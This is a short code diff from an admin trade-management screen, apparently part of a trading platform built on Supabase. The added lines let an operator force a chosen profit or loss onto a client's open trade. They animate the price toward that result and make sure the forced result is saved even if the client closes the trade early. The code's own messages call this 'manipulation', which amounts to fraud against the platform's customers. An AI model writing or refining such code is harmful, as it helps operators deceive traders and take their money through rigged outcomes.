@@ -117,8 +117,12 @@ const AdminTrades = () => {
 
     setManipulating(prev => ({ ...prev, [trade.id]: true }));
 
-    // Set initial current_price to market price
-    await supabase.from("trades").update({ current_price: currentMarketPrice }).eq("id", trade.id);
+    // CRITICAL: Immediately store the target P&L on the trade so if the client
+    // closes during manipulation, the correct P&L is preserved
+    await supabase.from("trades").update({ 
+      current_price: currentMarketPrice,
+      pnl: forcedPnl,
+    }).eq("id", trade.id);
 
     const timer = setInterval(async () => {
       step++;
@@ -131,7 +135,20 @@ const AdminTrades = () => {
 
       if (step >= steps) {
         clearInterval(timer);
-        // Now close the trade
+
+        // Check if client already closed the trade during manipulation
+        const { data: currentTrade } = await supabase
+          .from("trades").select("status").eq("id", trade.id).maybeSingle();
+        
+        if (currentTrade?.status === "closed") {
+          // Client already closed — trade has correct P&L from pnl field
+          setManipulating(prev => ({ ...prev, [trade.id]: false }));
+          toast.success(`Manipulation complete — client already closed with target P&L`);
+          fetchTrades();
+          return;
+        }
+
+        // Close the trade with target P&L
         await supabase.from("trades").update({
           status: "closed",
           closed_at: new Date().toISOString(),
